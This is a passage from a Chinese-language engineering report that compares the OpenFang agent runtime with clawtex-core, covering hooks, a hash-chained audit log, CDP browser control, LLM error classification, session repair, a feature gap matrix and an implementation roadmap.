    // 其他: Err -> 僅記錄
}

pub struct HookRegistry {
    handlers: DashMap<HookEvent, Vec<Arc<dyn HookHandler>>>,
}

// 四個鉤子事件:
pub enum HookEvent {
    BeforeToolCall,     // 可阻擋
    AfterToolCall,      // 觀察用
    BeforePromptBuild,  // 觀察用
    AgentLoopEnd,       // 觀察用
}
```

### 20.2 使用位置 (agent_loop.rs)

```
[1] BeforePromptBuild -- 系統提示建構前
       |
       v
[2] BeforeToolCall -- 每次工具呼叫前 (可阻擋)
       |
       v
[3] AfterToolCall -- 每次工具呼叫後
       |
       v
[4] AgentLoopEnd -- 迴圈結束 (成功/失敗/斷路器)
```

clawtex-core 沒有 hook 系統。

**Clawtex 實作建議** (P2): 先加入最有價值的 `BeforeToolCall` hook:
```rust
pub type ToolHook = Arc<dyn Fn(&str, &Value) -> Result<(), String> + Send + Sync>;

// 在 agent_runtime.rs 的工具呼叫前:
if let Some(hook) = &self.before_tool_hook {
    if let Err(reason) = hook(tool_name, &params) {
        return ToolResult::error(format!("Hook blocked: {}", reason));
    }
}
```

---

## 21. Audit 審計 Merkle Hash Chain

### 21.1 架構

**檔案**: `crates/openfang-runtime/src/audit.rs` (約 400 行)

這是 **clawtex 完全沒有的功能**, 也是 OpenFang 最有特色的安全設計之一。

```rust
pub enum AuditAction {
    ToolInvoke, CapabilityCheck, AgentSpawn, AgentKill,
    AgentMessage, MemoryAccess, FileAccess, NetworkAccess,
    ShellExec, AuthAttempt, WireConnect, ConfigChange,
}

pub struct AuditEntry {
    pub seq: u64,            // 遞增序號
    pub timestamp: String,   // ISO-8601
    pub agent_id: String,
    pub action: AuditAction,
    pub detail: String,
    pub outcome: String,
    pub prev_hash: String,   // 前一條的 hash (Merkle chain)
    pub hash: String,        // SHA-256(seq + ts + agent + action + detail + outcome + prev_hash)
}

pub struct AuditLog {
    entries: Mutex<Vec<AuditEntry>>,
    tip: Mutex<String>,           // 鏈尖 hash
    db: Option<Arc<Mutex<Connection>>>, // 持久化
}
```

### 21.2 Hash Chain 計算

```rust
fn compute_entry_hash(
    seq: u64, timestamp: &str, agent_id: &str,
    action: &AuditAction, detail: &str, outcome: &str,
    prev_hash: &str,
) -> String {
    let mut hasher = Sha256::new();
    hasher.update(seq.to_string().as_bytes());
    hasher.update(timestamp.as_bytes());
    hasher.update(agent_id.as_bytes());
    hasher.update(action.to_string().as_bytes());
    hasher.update(detail.as_bytes());
    hasher.update(outcome.as_bytes());
    hasher.update(prev_hash.as_bytes());
    hex::encode(hasher.finalize())
}
```

### 21.3 不可竄改性驗證

```
Entry[0]: prev_hash = 0000...0000 (genesis)
          hash = SHA256(0 | ts0 | agent0 | ... | 0000...0000)

Entry[1]: prev_hash = Entry[0].hash
          hash = SHA256(1 | ts1 | agent1 | ... | Entry[0].hash)

Entry[N]: prev_hash = Entry[N-1].hash
          hash = SHA256(N | tsN | agentN | ... | Entry[N-1].hash)

verify_integrity():
  for each entry:
    recompute = SHA256(fields + prev_hash)
    assert recompute == entry.hash
    assert entry.prev_hash == previous_entry.hash
```

### 21.4 持久化

```rust
pub fn with_db(conn: Arc<Mutex<Connection>>) -> Self {
    // 從 audit_entries 表載入所有歷史記錄
    // verify_integrity() 檢查鏈完整性
    // 記錄新條目同時寫入記憶體和 DB
}

pub fn record(&self, agent_id, action, detail, outcome) -> String {
    // 原子性: entries + tip 同時更新
    // 寫入 DB (如果有)
    // 返回新 hash
}
```

### 21.5 與 clawtex-core 差距

clawtex-core 有 `cost_records` 和簡單的 log, 但:
- 沒有 hash chain (可以被竄改)
- 沒有工具呼叫審計
- 沒有完整性驗證
- 沒有 agent 操作歷史

**Clawtex 實作建議** (P2, 約 3 小時):

```rust
// src/audit.rs (新檔案)
use sha2::{Sha256, Digest};

pub struct AuditLog {
    tip: Mutex<String>,
    db_path: PathBuf,
}

impl AuditLog {
    pub fn record(&self, agent: &str, action: &str, detail: &str, outcome: &str) -> String {
        let prev = self.tip.lock().unwrap().clone();
        let hash = compute_hash(agent, action, detail, outcome, &prev);
        // INSERT INTO audit_log (...)
        *self.tip.lock().unwrap() = hash.clone();
        hash
    }

    pub fn verify(&self) -> Result<(), String> {
        // 遍歷所有記錄, 重算 hash chain
    }
}
```

SQLite schema:
```sql
CREATE TABLE IF NOT EXISTS audit_log (
    seq INTEGER PRIMARY KEY,
    timestamp TEXT NOT NULL,
    agent TEXT NOT NULL,
    action TEXT NOT NULL,
    detail TEXT NOT NULL,
    outcome TEXT NOT NULL,
    prev_hash TEXT NOT NULL,
    hash TEXT NOT NULL
);
```

---

## 22. Browser CDP 原生自動化

### 22.1 架構

**檔案**: `crates/openfang-runtime/src/browser.rs` (約 600 行)

```rust
pub enum BrowserCommand {
    Navigate { url: String },
    Click { selector: String },
    Type { selector: String, text: String },
    Screenshot,
    ReadPage,
    Close,
    Scroll { direction: String, amount: i32 },
    Wait { selector: String, timeout_ms: u64 },
    RunJs { expression: String },
    Back,
}

struct CdpConnection {
    write: Arc<Mutex<SplitSink<WsStream, WsMessage>>>,
    pending: Arc<DashMap<u64, oneshot::Sender<Result<Value, String>>>>,
    next_id: AtomicU64,
    _reader_handle: JoinHandle<()>,
}
```

### 22.2 CDP WebSocket 通訊

```
OpenFang                        Chromium
   |                               |
   |  WebSocket connect            |
   |------------------------------>|
   |                               |
   |  { "method": "Page.navigate", |
   |    "params": {"url": "..."} } |
   |------------------------------>|
   |                               |
   |  { "id": 1, "result": {...} } |
   |<------------------------------|
   |                               |
   |  Runtime.evaluate(JS)         |
   |------------------------------>|
   |                               |
```

### 22.3 與 clawtex browser 對比

clawtex 的 `src/tools/browser.rs` 使用 Playwright (Python subprocess), OpenFang 使用原生 CDP WebSocket。

| 面向 | OpenFang (CDP) | clawtex (Playwright) |
|------|---------------|---------------------|
| 依賴 | 僅 tokio-tungstenite | Python + Playwright |
| 啟動速度 | 快 (直接 WebSocket) | 慢 (spawn Python) |
| 記憶體 | 低 | Python GC 開銷 |
| 安全 | Rust 型別安全 | Python 子程序風險 |
| 功能 | 基本 CDP 操作 | Playwright 全功能 |

**Clawtex 實作建議**: Playwright 功能更豐富, 但啟動慢。可以考慮加入 headless-chrome crate 作為替代方案。

---

## 23. LLM Error Classifier 錯誤分類

### 23.1 概念

**檔案**: `crates/openfang-runtime/src/llm_errors.rs` (由 agent_loop.rs 引用)

```rust
pub enum LlmErrorCategory {
    RateLimit,    // 429
    Overloaded,   // 529
    Auth,         // 401/403
    NotFound,     // 404
    Format,       // 400 (request format)
    Billing,      // quota/credit exhausted
    Server,       // 500+
    Network,      // connection failed
    Unknown,
}

pub struct ClassifiedError {
    pub category: LlmErrorCategory,
    pub is_retryable: bool,
    pub is_billing: bool,
    pub sanitized_message: String,
}

pub fn classify_error(raw: &str, status: Option<u16>) -> ClassifiedError {
    // 根據 HTTP status 和錯誤訊息文字分類
}
```

### 23.2 在 call_with_retry 中的使用

```rust
// agent_loop.rs
Err(e) => {
    let classified = llm_errors::classify_error(&e.to_string(), status);
    if classified.is_retryable { /* retry with backoff */ }
    if classified.is_billing { cooldown.record_failure(provider, true); }
    return Err(OpenFangError::LlmDriver(classified.sanitized_message));
}
```

clawtex-core 的 LLM 錯誤處理是通用的 `anyhow::Error`, 沒有分類。

**Clawtex 實作建議** (P1):
```rust
// src/llm_errors.rs
pub fn is_retryable(error: &str) -> bool {
    error.contains("rate limit") || error.contains("overloaded") || error.contains("529")
}
pub fn is_billing(error: &str) -> bool {
    error.contains("quota") || error.contains("credit") || error.contains("billing")
}
```

---

## 24. Session Repair 會話修復

### 24.1 概念

**檔案**: `crates/openfang-runtime/src/session_repair.rs` (由 agent_loop.rs 多處呼叫)

```rust
pub fn validate_and_repair(messages: &[Message]) -> Vec<Message> {
    // 1. 移除孤立的 ToolResult (沒有對應的前一條 ToolUse)
    // 2. 合併連續相同角色訊息
    // 3. 確保 ToolUse/ToolResult 配對完整
    // 4. 確保不以 System 開頭 (system prompt 另外傳)
}

pub fn prune_heartbeat_turns(messages: &mut Vec<Message>, max_heartbeats: usize) {
    // 移除 NO_REPLY 心跳輪次, 節省上下文
}
```

### 24.2 在 agent_loop.rs 中的呼叫點

1. **初始建構後**: `messages = validate_and_repair(&llm_messages);`
2. **History trimming 後**: `messages = validate_and_repair(&messages);` (drain 可能切斷配對)
3. **Overflow recovery 後**: `messages = validate_and_repair(&messages);`
4. **Empty response retry**: `if is_silent_failure { messages = validate_and_repair(&messages); }`

clawtex-core 完全沒有此機制, 這可能是造成「空回應」的原因之一。

**Clawtex 實作建議** (P0, 最高優先, 約 1.5 小時):

```rust
// src/session_repair.rs (新檔案)
use crate::providers::ChatMessage;

pub fn validate_and_repair(messages: &[ChatMessage]) -> Vec<ChatMessage> {
    let mut result = Vec::new();
    let mut pending_tool_ids: std::collections::HashSet<String> = std::collections::HashSet::new();

    for msg in messages {
        match &msg.role.as_str() {
            "assistant" => {
                // 記錄此 assistant 訊息中的 tool_use ids
                if let Some(tool_calls) = &msg.tool_calls {
                    for tc in tool_calls {
                        pending_tool_ids.insert(tc.id.clone());
                    }
                }
                result.push(msg.clone());
            }
            "tool" => {
                // 只保留有對應 tool_use 的 tool result
                if let Some(id) = &msg.tool_call_id {
                    if pending_tool_ids.contains(id) {
                        pending_tool_ids.remove(id);
                        result.push(msg.clone());
                    }
                    // 否則丟棄 (孤立的 tool result)
                }
            }
            _ => result.push(msg.clone()),
        }
    }
    result
}
```

---

## 25. 綜合差距矩陣

### 25.1 安全功能

| 功能 | OpenFang | clawtex-core | 優先級 | 預估工時 |
|------|----------|-------------|--------|---------|
| Env Allowlist (shell) | env_clear + allowlist | denylist | P0 | 30 min |
| Shell Metachar Block | 13 種字元 | 無 | P0 | 30 min |
| Taint Shell Check | 啟發式 + TaintSink | 無 | P1 | 1 hr |
| Taint URL Check | exfiltration 偵測 | 無 | P1 | 30 min |
| ShellBleed | 腳本環境變數掃描 | 無 | P1 | 2 hr |
| Capability Check | per-agent grant/check | 隱式 (tools list) | P2 | 1 hr |
| Audit Merkle Chain | SHA-256 hash chain | 無 | P2 | 3 hr |
| SSRF Check (MCP) | metadata endpoint 阻擋 | 無 | P1 | 30 min |

### 25.2 穩定性功能

| 功能 | OpenFang | clawtex-core | 優先級 | 預估工時 |
|------|----------|-------------|--------|---------|
| Session Repair | validate_and_repair | 無 | P0 | 1.5 hr |
| Context Overflow Recovery | 4 階段 | 無 | P0 | 2 hr |
| Error Fabrication Guard | 注入誠實指引 | 無 | P0 | 30 min |
| Approval Denial Guard | 防止重試被拒工具 | 無 | P0 | 30 min |
| LLM Error Classifier | 8 類別分類 | 無 | P1 | 1 hr |
| Text Tool Recovery | `<function=name>` 解析 | 無 | P1 | 1 hr |
| Global Circuit Breaker | 30 call 上限 | 無 | P1 | 30 min |
| Process Tree Kill | 跨平台 | 無 | P2 | 1 hr |

### 25.3 Agent Loop 功能

| 功能 | OpenFang | clawtex-core | 優先級 | 預估工時 |
|------|----------|-------------|--------|---------|
| Phase Callback | LoopPhase enum | 無 | P1 | 1 hr |
| Tool Name Normalization | alias mapping | 無 | P0 | 30 min |
| Hook System | 4 hooks, BeforeToolCall 可阻擋 | 無 | P2 | 2 hr |
| Canonical Context | 第一條 user message 注入 | 無 | P2 | 30 min |
| NO_REPLY / Silent | 偵測 + 處理 | 無 | P2 | 30 min |

### 25.4 工作流功能

| 功能 | OpenFang | clawtex-core | 優先級 | 預估工時 |
|------|----------|-------------|--------|---------|
| FanOut 平行 | join_all | 無 | P2 | 2 hr |
| Loop 迴圈 | until + max_iterations | 無 | P2 | 1 hr |
| 命名變數 | `{{var_name}}` | 無 | P1 | 1 hr |
| Error Retry | Retry { max_retries } | 無 | P1 | 30 min |
| Run 歷史 | 200 run 上限 + eviction | 無 | P2 | 1 hr |

### 25.5 基礎設施

| 功能 | OpenFang | clawtex-core | 優先級 | 預估工時 |
|------|----------|-------------|--------|---------|
| TriggerEngine | 事件驅動 agent 觸發 | 無 | P2 | 4 hr |
| Supervisor | panic/restart 追蹤 | 無 | P2 | 1 hr |
| Dynamic Context Budget | 按 window 比例截斷 | 固定上限 | P1 | 1 hr |
| MCP SSE Transport | HTTP SSE | 無 | P2 | 2 hr |
| MCP Env Sandbox | env_clear | 繼承全部 | P1 | 30 min |
| Structured LLM Error | thiserror enum | anyhow | P1 | 2 hr |

---

## 26. 優先實作路線圖

### Phase 1: 安全與穩定性 (P0, 本週)

**預估總工時: 5.5 小時**

1. **Session Repair** (1.5 hr) -- 修復空回應問題
2. **Context Overflow Recovery** (2 hr) -- 防止長對話崩潰
3. **Shell Env Allowlist** (30 min) -- `env_clear()` 取代 denylist
4. **Shell Metachar Block** (30 min) -- 阻擋注入
5. **Error Fabrication Guard** (30 min) -- 防止模型捏造結果
6. **Approval Denial Guard** (30 min) -- 防止重試循環

### Phase 2: 核心增強 (P1, 下週)

**預估總工時: 10 小時**

1. **Structured LLM Error** (2 hr) -- thiserror enum
2. **Taint Checks** (1.5 hr) -- shell + URL
3. **ShellBleed** (2 hr) -- 腳本環境掃描
4. **LLM Error Classifier** (1 hr) -- 分類 + 重試策略
5. **Dynamic Context Budget** (1 hr) -- 按 window 截斷
6. **Tool Name Normalization** (30 min) -- alias mapping
7. **MCP Env Sandbox** (30 min) -- env_clear
8. **Phase Callback** (1 hr) -- Telegram 即時狀態
9. **Global Circuit Breaker** (30 min) -- 30 call 上限

### Phase 3: 進階功能 (P2, 之後)

**預估總工時: 22 小時**

1. **Audit Merkle Chain** (3 hr)
2. **TriggerEngine** (4 hr)
3. **Hook System** (2 hr)
4. **Workflow FanOut** (2 hr)
5. **Workflow Loop** (1 hr)
6. **Workflow Named Vars** (1 hr)
7. **Supervisor** (1 hr)
8. **Capability Check** (1 hr)
9. **MCP SSE** (2 hr)
10. **Process Tree Kill** (1 hr)
11. **Text Tool Recovery** (1 hr)
12. **Run History** (1 hr)
13. **NO_REPLY** (30 min)
14. **Canonical Context** (30 min)
15. **Outcome-Aware Loop Guard** (1 hr)

---

## 附錄: 檔案索引

| OpenFang 檔案 | 行數 | 主要功能 | clawtex 對應 |
|-------------|------|---------|-------------|
| `runtime/src/agent_loop.rs` | ~950 | Agent 核心迴圈 | `src/agent_runtime.rs` |
| `runtime/src/think_filter.rs` | ~360 | ThinkFilter 串流 | `src/think_filter.rs` |
| `runtime/src/tool_runner.rs` | ~800 | 工具執行引擎 | `src/tools/mod.rs` |
| `runtime/src/subprocess_sandbox.rs` | ~350 | 環境隔離 | `src/providers/chatgpt_backend.rs` |
| `runtime/src/shell_bleed.rs` | ~355 | 環境洩漏偵測 | **無** |
| `runtime/src/llm_driver.rs` | ~200 | LLM Driver trait | `src/providers/mod.rs` |
| `runtime/src/drivers/qwen_code.rs` | ~400 | Qwen CLI 驅動 | `src/providers/chatgpt_backend.rs` |
| `runtime/src/drivers/fallback.rs` | ~115 | 鏈式降級 | `src/providers/rotation.rs` |
| `runtime/src/loop_guard.rs` | ~300 | 迴圈偵測 | `src/loop_detection.rs` |
| `runtime/src/context_budget.rs` | ~200 | 動態預算 | **無** |
| `runtime/src/context_overflow.rs` | ~137 | 溢出恢復 | **無** |
| `runtime/src/mcp.rs` | ~600 | MCP Client | `src/mcp_client.rs` |
| `runtime/src/audit.rs` | ~400 | Merkle 審計 | **無** |
| `runtime/src/browser.rs` | ~600 | CDP 瀏覽器 | `src/tools/browser.rs` |
| `runtime/src/hooks.rs` | ~150 | 鉤子系統 | **無** |
| `kernel/src/triggers.rs` | ~500 | 事件觸發 | **無** |
| `kernel/src/event_bus.rs` | ~150 | 事件匯流排 | `src/agent_events.rs` |
| `kernel/src/workflow.rs` | ~700 | 工作流引擎 | `src/hands/mod.rs` |
| `kernel/src/supervisor.rs` | ~228 | 程序監督 | **無** |
| `kernel/src/capabilities.rs` | ~96 | 權限管理 | **無 (隱式)** |

---

> **分析完成**: 本文件涵蓋 OpenFang 20+ 核心模組的深度分析, 每個模組包含原始碼片段、資料流圖、錯誤處理策略、效能特徵, 以及與 clawtex-core 的具體差距對比和實作建議。
>
> **下一步**: 按照第 26 節的優先實作路線圖, Phase 1 (P0 安全與穩定性) 應在本週完成。
